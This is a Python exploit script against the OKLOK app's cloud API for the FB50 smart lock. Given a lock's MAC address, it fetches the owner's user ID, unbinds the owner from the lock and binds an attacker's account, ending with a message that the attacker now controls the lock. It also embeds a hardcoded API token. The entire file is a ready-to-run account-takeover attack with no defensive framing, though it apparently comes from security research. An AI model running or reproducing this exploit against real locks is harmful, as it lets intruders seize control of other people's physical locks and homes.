#
# Exploit for the OKLOK mobile app / FB50 smartlock
# Authors: S. Raghav Pillai (@vologue), Anirudh Oppiliappan (@icyphox), Shubham Chougule (@shubhamtc) 
# 

import requests
import json
import sys

lock = {
    'userid': '',
    'lockid': '',
    'barcode': '',
    'mac': '',
    'name': ''
}


def query_device(h):
    data = {"mac" : lock['mac']}
    url = "https://app.oklok.com.cn/oklock/lock/queryDevice"
    resp = requests.request("POST", url, json=data, headers=h)
    lockinfo=resp.json()
    lock['barcode'] = lockinfo['result']['barcode']
    lock['lockid'] = lockinfo['result']['id']
    lock['name'] = lockinfo['result']['name']


def get_device_info(h):
    data = {"barcode":"https://app.oklok.com.cn/app.html?id={}".format(lock['barcode'])}
    url = "https://app.oklok.com.cn/oklock/lock/getDeviceInfo"
    resp = requests.request("POST", url, json=data, headers=h)
    lockinfo=resp.json()
    lock['userid'] = lockinfo['result']['userId']


def unbind(h):
    url = "https://app.oklok.com.cn/oklock/lock/unbind"
    data = {
        "lockId": lock['lockid'],
        "userId": lock['userid']
    }
    resp = requests.request("POST", url, json=data, headers=h)


def bind(attacker_id, h):
    url = "https://app.oklok.com.cn/oklock/lock/bind"
    data = {
        "name": lock['name'],
        "userId": attacker_id,
        "mac": lock['mac']
    }
    resp = requests.request("POST", url, json=data, headers=h)


if __name__ == "__main__":
    # user id, and device mac 
    try:
        attacker_id = sys.argv[1]
        mac = sys.argv[2]
    except IndexError:
        print("error: missing arguments")
        print("usage: " + sys.argv[0] + ' [id] [mac]')
        sys.exit()

    header = {
        'User-Agent': 'nokelockTool/1.4.8(Android 7.1.2 ; Xiaomi/Redmi 4)',
        'clientType': 'Android',
        'token': 'e717aabb210e48169ab28247ed6c65e9',
        'language': 'GB',
        'appVersion': '1.4.8',
        'Content-Type': 'application/json;charset=UTF-8',
        'Host': 'api.oklock.com.cn',
        'Connection': 'close',
        'Accept-Encoding': 'gzip, deflate',
    }

    lock['mac'] = mac
    print("[*] Fetching lock data...")
    query_device(header)
    print("[*] Fetching victim's user id...")
    get_device_info(header)
    print("[*] Unbinding victim from the lock...")
    unbind(header)
    print("[*] Binding your user to the lock...")
    bind(attacker_id, header)
    print("[*] Done! You should have control of the lock now.")
